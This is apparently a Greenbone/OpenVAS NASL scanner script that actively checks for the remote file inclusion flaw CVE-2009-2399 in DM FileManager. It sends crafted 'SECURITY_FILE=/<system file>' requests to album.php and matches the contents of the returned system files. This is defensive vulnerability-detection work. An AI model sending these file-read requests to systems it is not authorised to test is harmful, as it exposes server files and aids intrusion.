# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800836");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2009-07-15 13:05:34 +0200 (Wed, 15 Jul 2009)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2009-2399");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("DM FileManager <= 3.9.4 RFI Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_dm_filemanager_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("dm-filemanager/http/detected");

  script_tag(name:"summary", value:"DM FileManager is prone to a remote file inclusion (RFI)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Error exists when input passed to the 'SECURITY_FILE' parameter
  in 'album.php' in 'dm-albums/template/' directory is not properly verified before being used to
  include files.");

  script_tag(name:"impact", value:"Successful exploitation will let the remote attacker execute
  arbitrary PHP code, and can include arbitrary file from local or external resources when
  register_globals is enabled.");

  script_tag(name:"affected", value:"DutchMonkey, DM FileManager version 3.9.4 and prior.");

  script_tag(name:"solution", value:"Apply the security patch from the references.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/35622");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/35521");
  script_xref(name:"URL", value:"http://www.dutchmonkey.com/?label=Latest+News+%26+Announcements#20090704");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");

cpe_list = make_list("cpe:/a:dutchmonkey:dm_filemanager",
                     "cpe:/a:dutchmonkey:dm_album");

if (!infos = get_app_port_from_list(cpe_list: cpe_list, service: "www"))
  exit(0);

cpe = infos["cpe"];
port = infos["port"];

if (!dir = get_app_location(cpe: cpe, port: port))
  exit(0);

if (dir == "/")
  dir = "";

if ("dm_album" >< cpe)
  is_dm_album = TRUE;

files = traversal_files();

foreach pattern (keys(files)) {
  file = files[pattern];

  # nb: dir should already have the "/dm-albums" or "/albums" path found by gb_dm_filemanager_detect.nasl
  if (is_dm_album)
    url = dir + "/template/album.php?SECURITY_FILE=/" + file;
  else
    url = dir + "/dm-albums/template/album.php?SECURITY_FILE=/" + file;

  if (http_vuln_check(port: port, url: url, pattern: pattern)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
